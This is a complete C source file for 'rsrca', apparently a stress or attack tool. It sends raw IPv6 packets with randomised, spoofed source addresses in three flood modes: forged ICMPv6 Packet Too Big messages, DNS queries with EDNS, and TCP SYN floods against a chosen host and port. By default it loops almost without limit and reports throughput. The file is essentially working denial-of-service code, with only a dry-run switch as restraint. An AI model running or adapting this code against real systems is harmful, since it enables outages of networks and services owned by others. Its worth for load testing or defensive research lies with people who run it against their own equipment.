#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <getopt.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>

#include "rnd_cpp.h"

#define ARGV0 "rsrca"
#define CACHE_SIZE 8192

static struct {
	struct {
		int sck;
	} fd;
	struct {
		char str_addr[INET6_ADDRSTRLEN + sizeof("%4294967295") - 1];
	} dst;
	struct {
		struct timespec ts_last_report;
		uint64_t last_it_cnt;
	} bm;
	struct {
		uint64_t cache[CACHE_SIZE];
		size_t cur_c;
		int pipe[2];
		pid_t pid;
	} rnd;
	struct {
		struct {
			uint8_t m[256];
			size_t len;
		} rname;
	} dns;
} gctx;

static struct {
	struct {
		uint8_t addr[16];
		uint8_t mask[16];
		uint8_t len;
	} src_net;
	struct {
		const char *str;
		struct sockaddr_in6 sa;
	} dst;
	struct {
		bool dryrun;
		bool quiet;
		union {
			uint32_t help:1;
		};
	} flags;
	int v;
	const char *mode;
	struct {
		const char *rname;
		uint16_t rtype;
	} dns;
	uint16_t dst_port;
	uint64_t count;
} param;

static bool rnd_do_seed (void *ctx, const int fd) {
	const size_t seed_size = rnd_cpp_seed_size(ctx);
	uint8_t seed[seed_size];
	ssize_t iofr;

	iofr = read(fd, seed, seed_size);
	if (iofr < 0) {
		perror(ARGV0": seedrnd()");
		return false;
	}
	assert(iofr == (ssize_t)seed_size);

	rnd_cpp_seed(ctx, seed);

	return true;
}

static bool rnd_init (void *ctx) {
	static const rnd_cpp_t rct = RNDCPPTYPE_MT19937;
	int fd = -1;
	bool ret;

	if (!rnd_cpp_setopt(ctx, &rct)) {
		perror(ARGV0": rnd_cpp_setopt()");
		return false;
	}

	fd = open("/dev/urandom", O_RDONLY);
	if (fd < 0) {
		perror(ARGV0": /dev/urandom");
		return false;
	}

	ret = rnd_do_seed(ctx, fd);
	close(fd);

	return ret;
}

static void rnd_main (void) {
	const size_t ctx_size = rnd_cpp_ctx_size();
	uint8_t ctx[ctx_size];

	prctl(PR_SET_NAME, ARGV0"_c-rnd");

	memset(ctx, 0, ctx_size);
	if (!rnd_init(ctx)) {
		return;
	}

	while (true) {
		rnd_cpp(ctx, (uint8_t*)gctx.rnd.cache, sizeof(gctx.rnd.cache));
		write(gctx.rnd.pipe[1], gctx.rnd.cache, sizeof(gctx.rnd.cache));
	}
}

static void init_params (void) {
	param.dns.rtype = 16; // TXT
	param.count = UINT64_MAX;
}

static void init_global (void) {
	gctx.fd.sck = -1;
	gctx.rnd.cur_c = SIZE_MAX;

	gctx.rnd.pid = -1;
	gctx.rnd.pipe[0] = -1;
	gctx.rnd.pipe[1] = -1;
}

static void free_global (void) {
	close(gctx.fd.sck);
	close(gctx.rnd.pipe[0]);
	close(gctx.rnd.pipe[1]);
}

static bool alloc_globals (void) {
	int fr;

	fr = pipe(gctx.rnd.pipe);
	if (fr == 0) {
		int pipe_size = sizeof(gctx.rnd.cache);

		fcntl(gctx.rnd.pipe[0], F_SETPIPE_SZ, pipe_size);
		fcntl(gctx.rnd.pipe[1], F_SETPIPE_SZ, pipe_size);
	}
	else {
		perror(ARGV0": pipe()");
		return false;
	}

	gctx.rnd.pid = fork();
	if (gctx.rnd.pid < 0) {
		perror(ARGV0": fork()");
		return false;
	}
	else if (gctx.rnd.pid == 0) {
		close(gctx.rnd.pipe[0]);
		gctx.rnd.pipe[0] = -1;

		rnd_main();
		abort();
	}
	else {
		close(gctx.rnd.pipe[1]);
		gctx.rnd.pipe[1] = -1;
	}

	if (!param.flags.dryrun) {
		gctx.fd.sck = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
		if (gctx.fd.sck < 0) {
			fprintf(stderr, ARGV0": ");
			perror("socket()");
			return false;
		}
	}

	clock_gettime(CLOCK_MONOTONIC, &gctx.bm.ts_last_report);

	return true;
}

static void flush_rnd (void) {
	ssize_t iofr;

	iofr = read(gctx.rnd.pipe[0], gctx.rnd.cache, sizeof(gctx.rnd.cache));
	if (iofr != sizeof(gctx.rnd.cache)) {
		fprintf(stderr, ARGV0": rnd child died\n");
		abort();
	}

	gctx.rnd.cur_c = 0;
}

static uint64_t pull_rnd (void) {
	if (gctx.rnd.cur_c >= CACHE_SIZE) {
		flush_rnd();
	}

	return gctx.rnd.cache[gctx.rnd.cur_c++];
}

static void genrnd (size_t len, void *out) {
	uint8_t *buf = (uint8_t*)out;
	uint64_t n;
	size_t consume;

	if ((uintptr_t)out % sizeof(uint64_t) == 0) { // aligned
		while (len >= sizeof(uint64_t) * 2) {
			*((uint64_t*)buf) = pull_rnd();
			*((uint64_t*)buf + 1) = pull_rnd();
			len -= sizeof(uint64_t) * 2;
			buf += sizeof(uint64_t) * 2;
		}
		while (len >= sizeof(uint64_t)) {
			*((uint64_t*)buf) = pull_rnd();
			len -= sizeof(uint64_t);
			buf += sizeof(uint64_t);
		}
	}

	while (len > 0) {
		n = pull_rnd();
		consume = len > sizeof(n) ? sizeof(n) : len;
		memcpy(buf, &n, consume);
		len -= consume;
		buf += consume;
	}
}

static void print_help (FILE *f) {
	fprintf(f,
"Usage: %s [-hdq] [--help] [--dryrun] [--quiet] [-p|--dst-port PORT]"
"       [-c|--count COUNT] [-T|--rtype RTYPE] [-R|--rname RNAME]\n"
"       <--mode|-m MODE> [--] SRC_NET DST_ADDR\n"\
"MODE:        'ptb_flood_icmp6_echo' | 'dns_flood' | 'syn_flood'\n"
"SRC_NET:     2001:db8:1:2::/64\n"
"DST_ADDR:    any string accepted by getaddrinfo()\n"
"Options:\n"
"  -m, --mode MODE      run in specified mode\n"
"  -c, --count COUNT    number of iterations\n"
"  -p, --dst-port PORT  override destination port\n"
"  -R, --rname RNAME    QNAME to use in queries\n"
"  -T, --rtype RTYPE    numeric QTYPE to use in queries (default: 16 (TXT))\n"
"  -d, --dryrun         run in dry mode (don't actually send anything)\n"
"  -v, --verbose        increase verbosity\n"
"  -q, --quiet          report errors only\n"
"  -h, --help           print this message and exit normally\n"
		,
		ARGV0);
};

static void lock_ouput (void) {}
static void unlock_ouput (void) {}

static void report_sent (const void *addr, const int err) {
	char str_addr[INET6_ADDRSTRLEN] = { 0, };

	inet_ntop(AF_INET6, addr, str_addr, sizeof(str_addr));

	lock_ouput(); {
		printf(
			"{ \"what\": \"sendto\", \"msg\": { \"pid\": %d, \"from\": \"%s\", \"to\": \"%s\", \"error\": %d } }\n"
			,
			(int)getpid(),
			str_addr,
			gctx.dst.str_addr,
			err
		);
	}
	unlock_ouput();
}

static uint16_t calc_chksum6 (
	const struct ip6_hdr *ih,
	const uint8_t *nh,
	size_t n_len,
	const uint8_t *data,
	size_t data_len)
{
	uint_fast32_t sum = 0;
	const uint_fast32_t tcp_length = (uint32_t)(n_len + data_len);
	const uint8_t *addr_src = (const uint8_t*)&ih->ip6_src;
	const uint8_t *addr_dst = (const uint8_t*)&ih->ip6_dst;

	sum += ((uint_fast16_t)addr_src[0] << 8) | addr_src[1];
	sum += ((uint_fast16_t)addr_src[2] << 8) | addr_src[3];
	sum += ((uint_fast16_t)addr_src[4] << 8) | addr_src[5];
	sum += ((uint_fast16_t)addr_src[6] << 8) | addr_src[7];
	sum += ((uint_fast16_t)addr_src[8] << 8) | addr_src[9];
	sum += ((uint_fast16_t)addr_src[10] << 8) | addr_src[11];
	sum += ((uint_fast16_t)addr_src[12] << 8) | addr_src[13];
	sum += ((uint_fast16_t)addr_src[14] << 8) | addr_src[15];

	sum += ((uint_fast16_t)addr_dst[0] << 8) | addr_dst[1];
	sum += ((uint_fast16_t)addr_dst[2] << 8) | addr_dst[3];
	sum += ((uint_fast16_t)addr_dst[4] << 8) | addr_dst[5];
	sum += ((uint_fast16_t)addr_dst[6] << 8) | addr_dst[7];
	sum += ((uint_fast16_t)addr_dst[8] << 8) | addr_dst[9];
	sum += ((uint_fast16_t)addr_dst[10] << 8) | addr_dst[11];
	sum += ((uint_fast16_t)addr_dst[12] << 8) | addr_dst[13];
	sum += ((uint_fast16_t)addr_dst[14] << 8) | addr_dst[15];

	sum += (uint16_t)((tcp_length & 0xFFFF0000) >> 16);
	sum += (uint16_t)(tcp_length & 0xFFFF);
	sum += ih->ip6_ctlun.ip6_un1.ip6_un1_nxt;

	// tcp header
	while (n_len > 1) {
		sum += ((uint_fast32_t)nh[0] << 8) + nh[1];
		nh += 2;
		n_len -= 2;
	}
	if (n_len > 0) {
		sum += nh[0];
	}

	// data
	while (data_len > 1) {
		sum += ((uint_fast32_t)data[0] << 8) + data[1];
		data += 2;
		data_len -= 2;
	}
	if (data_len > 0) {
		sum += data[0];
	}

	return ~((sum & 0xFFFF) + (sum >> 16));
}

static void genrnd_src_addr (void *out) {
	const size_t p_Blen = param.src_net.len / 8;
	uint8_t *o = (uint8_t*)out;
	uint8_t m;

	genrnd(16 - p_Blen, o + p_Blen);

	for (size_t i = 0; i < 16; i += 1) {
		m = param.src_net.mask[i];
		o[i] = (param.src_net.addr[i] & m) | (o[i] & ~m);
	}
}

static void ts_sub (
		struct timespec *out,
		const struct timespec *a,
		const struct timespec *b)
{
	if (a->tv_nsec < b->tv_nsec) {
		out->tv_sec = a->tv_sec - 1 - b->tv_sec;
		out->tv_nsec = 1000000000 + a->tv_nsec - b->tv_nsec;
	}
	else {
		out->tv_sec = a->tv_sec - b->tv_sec;
		out->tv_nsec = a->tv_nsec - b->tv_nsec;
	}
}

static void do_report_print (
		const uint64_t it_period,
		const struct timespec *ts_elapsed)
{
	lock_ouput(); {
		printf(
			"{ \"what\": \"throughput\", \"msg\": { \"pid\": %d, \"duration\": %ld.%03ld, \"count\": %zu } }\n"
			,
			(int)getpid(),
			(long)ts_elapsed->tv_sec,
			ts_elapsed->tv_nsec / 1000000,
			it_period
		);
	}
	unlock_ouput();
}

static void do_report (const uint64_t cur_it) {
	struct timespec ts_now, ts_elapsed;

	clock_gettime(CLOCK_MONOTONIC, &ts_now);
	ts_sub(&ts_elapsed, &ts_now, &gctx.bm.ts_last_report);

	if (ts_elapsed.tv_sec <= 0) {
		return;
	}

	do_report_print(cur_it - gctx.bm.last_it_cnt, &ts_elapsed);

	gctx.bm.ts_last_report = ts_now;
	gctx.bm.last_it_cnt = cur_it;
}

static void mount_attack_icmp6_ptb (void) {
	struct {
		struct ip6_hdr ih6;
		struct icmp6_hdr icmp6;
		struct {
			struct ip6_hdr ih6;
			struct icmp6_hdr icmp6;
		} body;
	} snd_buf = { 0, };
	ssize_t fr;

	memcpy(&snd_buf.ih6.ip6_dst, &param.dst.sa.sin6_addr, 16);
	snd_buf.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_ICMPV6;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(sizeof(snd_buf) - sizeof(struct ip6_hdr));
	snd_buf.icmp6.icmp6_type = ICMP6_PACKET_TOO_BIG;
	snd_buf.icmp6.icmp6_dataun.icmp6_un_data32[0] = htonl(1280);

	snd_buf.body.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
	snd_buf.body.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
	snd_buf.body.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_ICMPV6;
	snd_buf.body.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(sizeof(struct icmp6_hdr));
	memcpy(&snd_buf.body.ih6.ip6_src, &snd_buf.ih6.ip6_dst, 16);
	snd_buf.body.icmp6.icmp6_type = ICMP6_ECHO_REPLY;
	genrnd(sizeof(uint32_t), snd_buf.body.icmp6.icmp6_dataun.icmp6_un_data8);

	for (uint64_t it = 0; it < param.count ; it += 1) {
		genrnd_src_addr(&snd_buf.ih6.ip6_src);
		memcpy(&snd_buf.body.ih6.ip6_dst, &snd_buf.ih6.ip6_src, 16);

		snd_buf.body.icmp6.icmp6_cksum = 0;
		snd_buf.body.icmp6.icmp6_cksum = htons(calc_chksum6(
			&snd_buf.body.ih6,
			(const uint8_t*)&snd_buf.body.icmp6,
			sizeof(struct icmp6_hdr),
			NULL,
			0
		));

		snd_buf.icmp6.icmp6_cksum = 0;
		snd_buf.icmp6.icmp6_cksum = htons(calc_chksum6(
			&snd_buf.ih6,
			(const uint8_t*)&snd_buf.icmp6,
			sizeof(snd_buf) - sizeof(struct ip6_hdr),
			NULL,
			0
		));

		errno = 0;
		fr = param.flags.dryrun ? 0 : sendto(
			gctx.fd.sck,
			&snd_buf,
			sizeof(snd_buf),
			MSG_NOSIGNAL,
			(const struct sockaddr*)&param.dst.sa,
			sizeof(struct sockaddr_in6));

		if (fr < 0 || (!param.flags.quiet && param.v > 0)) {
			report_sent(&snd_buf.ih6.ip6_src, errno);
		}
		if (!param.flags.quiet) {
			do_report(it);
		}
	}
}

static int main_ptb_flood_icmp6_echo (void) {
	// TODO: parallelise?
	mount_attack_icmp6_ptb();
	return 0;
}

static void foreach_label (
		const char *in_rname,
		void *uc,
		bool(*cb)(char *label, uint8_t len, void *uc))
{
	char rname[256];
	char *p, *dot;
	uint8_t len;

	p = rname;
	strncpy(rname, in_rname, sizeof(rname) - 1);

	do {
		dot = strchr(p, '.');

		if (dot != NULL) {
			*dot = 0;
		}
		len = (uint8_t)strlen(p);
		if (len > 0) {
			if (!cb(p, len, uc)) {
				return;
			}
		}
		p = dot + 1;
	} while (dot != NULL);

	cb(NULL, 0, uc);
}

static bool label_rname (char *label, uint8_t len, void *) {
	assert(gctx.dns.rname.len + len < sizeof(gctx.dns.rname));

	gctx.dns.rname.m[gctx.dns.rname.len] = len;
	memcpy(gctx.dns.rname.m + 1 + gctx.dns.rname.len, label, len);
	gctx.dns.rname.len += (size_t)len + 1;

	return true;
}

static void mount_attack_dns_flood (void) {
	struct {
		struct ip6_hdr ih6;
		struct udphdr udp;
		uint8_t data[512];
	} snd_buf = { 0, };
	ssize_t fr;
	const uint16_t data_len = (uint16_t)gctx.dns.rname.len + 27;

	memcpy(&snd_buf.ih6.ip6_dst, &param.dst.sa.sin6_addr, 16);
	snd_buf.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_UDP;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(
		(uint16_t)sizeof(struct udphdr) +
		data_len
	);
	snd_buf.udp.uh_dport = htons(param.dst_port);
	snd_buf.udp.uh_ulen = htons((uint16_t)sizeof(struct udphdr) + data_len);

	// QR: 0, Opcode: 0, AA:0, TC: 0, RD: 1, RA: 0, Z: 0, RCODE: 0
	snd_buf.data[2] = 0x01;
	snd_buf.data[3] = 0x00;
	// QDCOUNT: 1
	snd_buf.data[4] = 0x00;
	snd_buf.data[5] = 0x01;
	// ANCOUNT, NSCOUNT
	snd_buf.data[6] = snd_buf.data[7] = snd_buf.data[8] = snd_buf.data[9] = 0x00;
	// ARCOUNT: 1
	snd_buf.data[10] = 0x00;
	snd_buf.data[11] = 0x01;
	// QNAME
	memcpy(snd_buf.data + 12, gctx.dns.rname.m, gctx.dns.rname.len);
	// QTYPE
	snd_buf.data[gctx.dns.rname.len + 12] = (uint8_t)((param.dns.rtype & 0xff00) >> 8);
	snd_buf.data[gctx.dns.rname.len + 13] = (uint8_t)(param.dns.rtype & 0x00ff);
	// QCLASS: IN
	snd_buf.data[gctx.dns.rname.len + 14] = 0x00;
	snd_buf.data[gctx.dns.rname.len + 15] = 0x01;

	// NAME: ROOT
	snd_buf.data[gctx.dns.rname.len + 16] = 0x00;
	// OPT
	snd_buf.data[gctx.dns.rname.len + 17] = 0x00;
	snd_buf.data[gctx.dns.rname.len + 18] = 0x29;
	// UDP payload size: 1298
	snd_buf.data[gctx.dns.rname.len + 19] = 0x05;
	snd_buf.data[gctx.dns.rname.len + 20] = 0x12;

	snd_buf.data[gctx.dns.rname.len + 21] = 0x00;
	snd_buf.data[gctx.dns.rname.len + 22] = 0x00;

	snd_buf.data[gctx.dns.rname.len + 23] = 0x00;
	snd_buf.data[gctx.dns.rname.len + 24] = 0x00;
	// Data length: 0
	snd_buf.data[gctx.dns.rname.len + 25] = 0x00;
	snd_buf.data[gctx.dns.rname.len + 26] = 0x00;

	for (uint64_t it = 0; it < param.count; it += 1) {
		genrnd_src_addr(&snd_buf.ih6.ip6_src);

		// ID
		genrnd(2, snd_buf.data);
		snd_buf.data[1] |= 1; // as 0 is reserved

		genrnd(2, &snd_buf.udp.uh_sport);
		snd_buf.udp.uh_sport = htons((snd_buf.udp.uh_sport % 59975) + 1025);
		snd_buf.udp.uh_sum = 0;
		snd_buf.udp.uh_sum = htons(calc_chksum6(
			&snd_buf.ih6,
			(const uint8_t*)&snd_buf.udp,
			sizeof(snd_buf.udp),
			snd_buf.data,
			data_len
		));

		errno = 0;
		fr = param.flags.dryrun ? 0 : sendto(
			gctx.fd.sck,
			&snd_buf,
			sizeof(struct ip6_hdr) + sizeof(struct udphdr) + data_len,
			MSG_NOSIGNAL,
			(const struct sockaddr*)&param.dst.sa,
			sizeof(struct sockaddr_in6));

		if (fr < 0 || (!param.flags.quiet && param.v > 0)) {
			report_sent(&snd_buf.ih6.ip6_src, errno);
		}
		if (!param.flags.quiet) {
			do_report(it);
		}
	}
}

static void init_dns_txt_labels (void) {
	gctx.dns.rname.len = 0;
	foreach_label(param.dns.rname, NULL, label_rname);
	assert(gctx.dns.rname.len < sizeof(gctx.dns.rname.m));
}

static int main_dns_flood (void) {
	// TODO: parallelise?
	init_dns_txt_labels();

	mount_attack_dns_flood();

	return 0;
}

static void mount_attack_syn_flood (void) {
	struct {
		struct ip6_hdr ih6;
		struct tcphdr tcp;
	} snd_buf = { 0, };
	ssize_t fr;

	memcpy(&snd_buf.ih6.ip6_dst, &param.dst.sa.sin6_addr, 16);
	snd_buf.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_TCP;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons((uint16_t)sizeof(struct tcphdr));

	snd_buf.tcp.th_dport = htons(param.dst_port);
	snd_buf.tcp.th_off = sizeof(struct tcphdr) / 4;
	snd_buf.tcp.th_flags = TH_SYN;
	snd_buf.tcp.th_win = 0xffff;

	for (uint64_t it = 0; it < param.count; it += 1) {
		genrnd_src_addr(&snd_buf.ih6.ip6_src);

		genrnd(sizeof(snd_buf.tcp.th_seq), &snd_buf.tcp.th_seq);

		genrnd(2, &snd_buf.tcp.th_sport);
		snd_buf.tcp.th_sport = htons((snd_buf.tcp.th_sport % 59975) + 1025);
		snd_buf.tcp.th_sum = 0;
		snd_buf.tcp.th_sum = htons(calc_chksum6(
			&snd_buf.ih6,
			(const uint8_t*)&snd_buf.tcp,
			sizeof(snd_buf.tcp),
			NULL,
			0
		));

		errno = 0;
		fr = param.flags.dryrun ? 0 : sendto(
			gctx.fd.sck,
			&snd_buf,
			sizeof(struct ip6_hdr) + sizeof(struct tcphdr),
			MSG_NOSIGNAL,
			(const struct sockaddr*)&param.dst.sa,
			sizeof(struct sockaddr_in6));

		if (fr < 0 || (!param.flags.quiet && param.v > 0)) {
			report_sent(&snd_buf.ih6.ip6_src, errno);
		}
		if (!param.flags.quiet) {
			do_report(it);
		}
	}
}

static int main_syn_flood (void) {
	mount_attack_syn_flood();

	return 0;
}

static void fill_prefix (uint8_t len, uint8_t *out) {
	const size_t cnt_bytes = len / 8;
	size_t i;

	for (i = 0; i < cnt_bytes; i += 1) {
		out[i] = 0xff;
	}
	len -= cnt_bytes * 8;
	out += i;
	for (i = 0; i < len; i += 1) {
		*out = (*out << 1) | 1;
	}
}

static bool parse_net_str (
		const char *in_str,
		void *addr,
		void *mask,
		uint8_t *len)
{
	char str[INET6_ADDRSTRLEN];
	char *slash;
	uint8_t ret_buf[16];
	uint8_t ret_mask[16] = { 0, };
	uint8_t ret_len = 0;
	int fr;

	strncpy(str, in_str, sizeof(str) - 1);
	slash = strchr(str, '/');
	if (slash != NULL) {
		*slash = 0;

		if (sscanf(slash + 1, "%"SCNu8, &ret_len) != 1 || ret_len > 128) {
			errno = EINVAL;
			return false;
		}
	}
	else {
		ret_len = 128;
	}

	fr = inet_pton(AF_INET6, str, ret_buf);
	if (fr == 0) {
		errno = EINVAL;
		return false;
	}
	else if (fr < 0) {
		return false;
	}
	fill_prefix(ret_len, ret_mask);

	memcpy(addr, ret_buf, 16);
	memcpy(mask, ret_mask, 16);
	*len = ret_len;
	return true;
}

static bool parse_param (const int argc, const char **argv) {
	static const struct option LOPTS[] = {
		{ "help",     false, NULL, 'h' },
		{ "dryrun",   false, NULL, 'd' },
		{ "quiet",    false, NULL, 'q' },
		{ "mode",     true,  NULL, 'm' },
		{ "verbose",  false, NULL, 'v' },
		{ "rname",    true,  NULL, 'R' },
		{ "rtype",    true,  NULL, 'T' },
		{ "dst-port", true,  NULL, 'p' },
		{ "count",    true,  NULL, 'c' },
	};
	int loi = -1;
	int fr;
	bool fallthrough = false;

	while (true) {
		fr = getopt_long(argc, (char *const*)argv, "hdqm:vT:R:p:c:", LOPTS, &loi);
		if (fr < 0) {
			break;
		}

		switch (fr) {
		case 'h': fallthrough = (param.flags.help = true); break;
		case 'd': param.flags.dryrun = true; break;
		case 'q': param.flags.quiet = true; break;
		case 'm': param.mode = optarg; break;
		case 'v': param.v += 1; break;
		case 'R': param.dns.rname = optarg; break;
		case 'T':
			if (sscanf(optarg, "%"SCNu16, &param.dns.rtype) != 1 ||
					param.dns.rtype == 0)
			{
				errno = EINVAL;
				fprintf(stderr, ARGV0": -T %s: ", optarg);
				perror(NULL);
				return false;
			}
			break;
		case 'p':
			if (sscanf(optarg, "%"SCNu16, &param.dst_port) != 1) {
				errno = EINVAL;
				fprintf(stderr, ARGV0": -p %s: ", optarg);
				perror(NULL);
				return false;
			}
			break;
		case 'c':
			if (sscanf(optarg, "%"SCNu64, &param.count) != 1 || param.count == 0) {
				errno = EINVAL;
				fprintf(stderr, ARGV0": -c %s: ", optarg);
				perror(NULL);
				return false;
			}
			break;
		default: return false;
		}
	}

	if (fallthrough) {
		return true;
	}

	if (param.mode == NULL) {
		fprintf(stderr, ARGV0": missing option -m. Run with -h option for help\n");
		return false;
	}

	if (optind + 1 >= argc) {
		fprintf(stderr, ARGV0": too few arguments\n");
		return false;
	}

	fr = parse_net_str(
		argv[optind],
		param.src_net.addr,
		param.src_net.mask,
		&param.src_net.len
	);
	if (!fr) {
		fprintf(stderr, ARGV0": ");
		perror(argv[optind]);
		return false;
	}

	param.dst.str = argv[optind + 1];

	return true;
}

static bool resolve_dst (void) {
	static struct addrinfo hints = { 0, };
	int fr;
	struct addrinfo *ai = NULL;
	char addr_str[INET6_ADDRSTRLEN] = { 0, };

	hints.ai_family = AF_INET6;
	// hints.ai_socktype = SOCK_RAW;
	// hints.ai_protocol = IPPROTO_RAW;
	fr = getaddrinfo(param.dst.str, NULL, &hints, &ai);
	if (fr != 0) {
		return false;
	}

	// hostname resolve. copy the sa into our address space
	assert(sizeof(param.dst.sa) == ai->ai_addrlen);
	memcpy(&param.dst.sa, ai->ai_addr, sizeof(param.dst.sa));

	// cache the selected dst address string for reporting purposes
	inet_ntop(AF_INET6, &param.dst.sa.sin6_addr, addr_str, sizeof(addr_str));
	if (param.dst.sa.sin6_scope_id > 0) {
		snprintf(
			gctx.dst.str_addr,
			sizeof(gctx.dst.str_addr),
			"%s%%%"PRIu32
			,
			addr_str,
			param.dst.sa.sin6_scope_id
		);
	}
	else {
		strncpy(gctx.dst.str_addr, addr_str, sizeof(gctx.dst.str_addr) - 1);
	}

	freeaddrinfo(ai);
	return true;
}

int main (const int argc, const char **argv) {
	int ec = 0;

	init_params();
	init_global();

	if (!parse_param(argc, argv)) {
		ec = 2;
		goto END;
	}

	if (param.flags.help) {
		print_help(stdout);
		goto END;
	}

	if (!alloc_globals()) {
		ec = 1;
		goto END;
	}

	if (!resolve_dst()) {
		fprintf(stderr, ARGV0": ");
		perror(param.dst.str);
		ec = 1;
		goto END;
	}
	if (!param.flags.quiet) {
		fprintf(stderr, ARGV0": selected target: %s\n", gctx.dst.str_addr);
	}

	if (strcmp(param.mode, "ptb_flood_icmp6_echo") == 0) {
		ec = main_ptb_flood_icmp6_echo();
	}
	else if (strcmp(param.mode, "dns_flood") == 0) {
		if (param.dns.rname == NULL) {
			fprintf(stderr, ARGV0": missing option -R. Run with -h option for help\n");
			ec = 2;
			goto END;
		}

		if (param.dst_port == 0) {
			param.dst_port = 53;
		}

		ec = main_dns_flood();
	}
	else if (strcmp(param.mode, "syn_flood") == 0) {
		if (param.dst_port == 0) {
			fprintf(stderr, ARGV0": missing option -p. Run with -h option for help\n");
			ec = 2;
			goto END;
		}

		ec = main_syn_flood();
	}
	else {
		fprintf(stderr, ARGV0": ");
		errno = EINVAL;
		perror(param.mode);
		ec = 2;
	}

END:
	free_global();
	return ec;
}
